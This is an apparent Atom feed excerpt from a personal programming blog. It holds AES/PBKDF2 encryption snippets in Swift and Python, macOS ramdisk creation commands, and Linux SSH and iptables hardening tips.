&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">operation&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// Operation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">algorithm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ccAlgorithm&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="c1">// Algorithm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">options&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// Options&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">UnsafePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">Void&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">derivedKey&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">bytes&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// key data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">derivedKey&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// key length&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">UnsafePointer&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nb">Void&lt;/span>&lt;span class="p">&amp;gt;(&lt;/span>&lt;span class="n">derivedIV&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">bytes&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// IV buffer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">plaintextBytes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// input data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">palintextLen&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// input length&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outBufferPtr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// output buffer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outBufferLen&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// output buffer length&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;amp;&lt;/span>&lt;span class="n">bytesDecrypted&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// length of bytes decrypted&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">guard&lt;/span> &lt;span class="nb">Int32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cryptStatus&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">==&lt;/span> &lt;span class="nb">Int32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">kCCSuccess&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CryptorError&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">EncryptError&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">bytesDecrypted&lt;/span> &lt;span class="c1">// Adjust buffer size to real bytes&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">randomSalt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">outBuffer&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">NSData&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>AES with PBKDF2 &amp;amp; PKCS7Padding &amp;amp; CBC mode in Python:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">Crypto.Cipher&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">AES&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">Crypto&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Random&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pbkdf2&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PBKDF2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PBKDF2_ROUNDS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">AESEncrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># padding&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AES&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">block_size&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">padding_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bs&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">bs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">plaintext&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">padding_len&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">padding_len&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># prepare parameters&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">salt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Random&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">derived&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PBKDF2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PBKDF2_ROUNDS&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">iv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">derived&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">derived&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># encrypt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cipher&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AES&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">AES&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MODE_CBC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">iv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cyphertext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cipher&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cyphertext&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">AESDecrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cyphertext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># derive key &amp;amp; iv&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">derived&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PBKDF2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PBKDF2_ROUNDS&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">iv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">derived&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">derived&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># decrypt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cipher&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AES&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">AES&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MODE_CBC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">iv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">plaintext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cipher&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cyphertext&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># unpadding&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">padding_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">plaintext&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">padding_len&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/security/" term="Security" label="Security"/><category scheme="https://mincodes.com/tags/algorithm/" term="Algorithm" label="Algorithm"/></entry><entry><title type="text">Create Ramdisk on macOS</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/create-ramdisk-on-macos/"/><id>https://mincodes.com/posts/create-ramdisk-on-macos/</id><updated>2022-12-04T12:18:00+00:00</updated><published>2022-12-04T12:17:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Creating a 1000MB ramdisk:
1 2 3 4 5 6 7 8 9 10 11 12 $ hdiutil attach -nomount ram://$((2048 * 1000)) /dev/disk3 $ diskutil eraseVolume HFS+ RAMDisk /dev/disk3 Started erase on disk3 Unmounting disk Erasing Initialized /dev/rdisk3 as a 1000 MB case-insensitive HFS Plus volume Mounting disk Finished erase on disk3 RAMDisk $ hdiutil detach /dev/disk3</summary><content type="html">&lt;p>Creating a 1000MB ramdisk:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ hdiutil attach -nomount ram://&lt;span class="k">$((&lt;/span>&lt;span class="m">2048&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="m">1000&lt;/span>&lt;span class="k">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/dev/disk3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ diskutil eraseVolume HFS+ RAMDisk /dev/disk3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Started erase on disk3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unmounting disk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Erasing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Initialized /dev/rdisk3 as a &lt;span class="m">1000&lt;/span> MB &lt;span class="k">case&lt;/span>-insensitive HFS Plus volume
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mounting disk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Finished erase on disk3 RAMDisk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ hdiutil detach /dev/disk3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/macos/" term="Macos" label="Macos"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/></entry><entry><title type="text">Linux Security Tips</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/linux-security-tips/"/><id>https://mincodes.com/posts/linux-security-tips/</id><updated>2022-12-04T13:37:00+00:00</updated><published>2022-12-04T12:15:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ssh Modify /etc/ssh/sshd_config:
1 2 3 4 5 6 7 8 9 10 11 12 13 # Disable root login PermitRootLogin no # Change the default port Port 12345 # Enable login with key RSAAuthentication yes PubkeyAuthentication yes # Disable login with password UsePAM no PasswordAuthentication no After that, remember to restart sshd: sudo /etc/init.</summary><content type="html">&lt;h2 id="ssh">ssh&lt;/h2>
&lt;p>Modify &lt;code>/etc/ssh/sshd_config&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Disable root login&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PermitRootLogin no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Change the default port&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Port &lt;span class="m">12345&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Enable login with key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RSAAuthentication yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PubkeyAuthentication yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Disable login with password&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">UsePAM no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PasswordAuthentication no
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After that, remember to restart sshd: &lt;code>sudo /etc/init.d/ssh restart&lt;/code>
(for Debian/Ubuntu) or &lt;code>sudo service sshd restart&lt;/code> (for CentOS).&lt;/p>
&lt;h2 id="iptables">iptables&lt;/h2>
&lt;ul>
&lt;li>Refer to &lt;a href="https://wiki.debian.org/iptables*">https://wiki.debian.org/iptables*&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>Create the file &lt;code>/etc/iptables.test.rules&lt;/code>, and enter rules:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">*filter
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Allows all loopback (lo0) traffic and drop all traffic to 127/8 that doesn&amp;#39;t use lo0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -i lo -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT ! -i lo -d 127.0.0.0/8 -j REJECT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Accepts all established inbound connections&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Allows all outbound traffic&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># You could modify this to only allow certain traffic&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A OUTPUT -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Allows HTTP and HTTPS connections from anywhere (the normal ports for websites)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -p tcp --dport &lt;span class="m">80&lt;/span> -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -p tcp --dport &lt;span class="m">443&lt;/span> -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Allows SSH connections&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># The --dport number is the same as in /etc/ssh/sshd_config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -p tcp -m state --state NEW --dport &lt;span class="m">22&lt;/span> -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Now you should read up on iptables rules and consider whether ssh access&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># for everyone is really desired. Most likely you will only allow access from certain IPs.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Allow ping&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># note that blocking other types of icmp packets is considered a bad idea by some&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># remove -m icmp --icmp-type 8 from this line to allow all kinds of icmp:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;lt;https://security.stackexchange.com/questions/22711&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -p icmp -m icmp --icmp-type &lt;span class="m">8&lt;/span> -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># log iptables denied calls (access via &amp;#39;dmesg&amp;#39; command)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -m limit --limit 5/min -j LOG --log-prefix &lt;span class="s2">&amp;#34;iptables denied: &amp;#34;&lt;/span> --log-level &lt;span class="m">7&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Reject all other inbound - default deny unless explicitly allowed policy:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A INPUT -j REJECT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-A FORWARD -j REJECT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">COMMIT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Apply these rules:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
